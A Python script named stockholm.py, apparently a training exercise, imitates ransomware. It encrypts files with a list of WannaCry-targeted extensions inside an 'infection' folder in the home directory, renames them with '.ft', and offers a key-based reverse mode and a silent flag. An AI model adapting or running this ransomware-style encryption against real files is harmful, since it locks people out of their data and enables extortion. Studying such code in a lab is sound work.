import os
import sys
import argparse
from pathlib import Path
from utils.simple_crypt_compat import encrypt_file, decrypt_file


VERSION = "1.0.0"
DIRECTORY = Path(Path.home() / "infection")
silentMode = False

# List of WannaCry targeted file extensions
targeted_extensions = {
    # Documents
    ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".rtf", ".txt",
    # Images
    ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tif", ".tiff",
    # Archives
    ".zip", ".rar", ".7z", ".tar", ".gz",
    # Database files
    ".sql", ".accdb", ".mdb",
    # Other
    ".py", ".c", ".cpp", ".cs", ".html", ".css", ".js", ".php"
}

def logs(message):
    global silentMode

    if not silentMode:
        print(message)

def check_file_extension(file_path):
    return os.path.splitext(file_path)[1].lower() in targeted_extensions



def decryption_process(file_path, key):
    if os.path.splitext(file_path)[1].lower() == '.ft':
        logs(f"decryption process started for {file_path}")
        decrypt_file(file_path, key)
        logs(f"File decrypted successfully! Saved as {Path(file_path).with_suffix('') }\n")
    else:
        logs(f"ignoring {file_path}\n")

def encryption_process(file_path, key):
    if check_file_extension(file_path):
        logs(f"encryption process started for {file_path}")
        encrypt_file(file_path, key)
        logs(f"File encrypted successfully! Saved as {file_path}.ft\n")
    else:
        logs(f"ignoring {file_path}\n")

def process_directories(args):
    if args.reverse:
        logs(f"Decrypting infection folder with key: {args.reverse}\n")
        for file_path in DIRECTORY.rglob('*'):
            if file_path.is_file():
                decryption_process(file_path, args.reverse)
        logs(f"Finished decrypting infection folder:\n")
    else:
        logs(f"Encrypting infection folder:\n")
        for file_path in DIRECTORY.rglob('*'):
            if file_path.is_file():
                encryption_process(file_path, args.password)
        logs(f"Finished encrypting infection folder:\n")

def args_parser():
    parser = argparse.ArgumentParser(description='Encrypt or reverse infection in files.')
    
    # Adding command-line arguments
    parser.add_argument('-v', '--version', action='version', version=f'%(prog)s {VERSION}')
    parser.add_argument('-r', '--reverse', metavar='KEY', help='Reverse the infection using the specified KEY.')
    parser.add_argument('-p', '--password', metavar='KEY', help='Encrypt the infection using the specified KEY.')
    parser.add_argument('-s', '--silent', action='store_true', help='Run silently without outputting encrypted file names.')

    return parser.parse_args()

def main():
    if len(sys.argv) == 1:
        sys.exit(print("usage: stockholm.py [-h] [-v] [-r KEY] [-p KEY] [-s]\n"))

    global silentMode
    
    args = args_parser()

    silentMode = args.silent

    if args.password:
        if len(args.password) < 16:
            sys.exit(logs("password must be at least 16 characters long.\n"))
    
    if not silentMode:
        logs("Running in normal mode...\n")

    process_directories(args)

    return 0

if __name__ == "__main__":
    try:
        sys.exit(main())
    except Exception as e:
        if not silentMode:
            print(f"Error: {e}", file=sys.stderr)
        sys.exit(1)
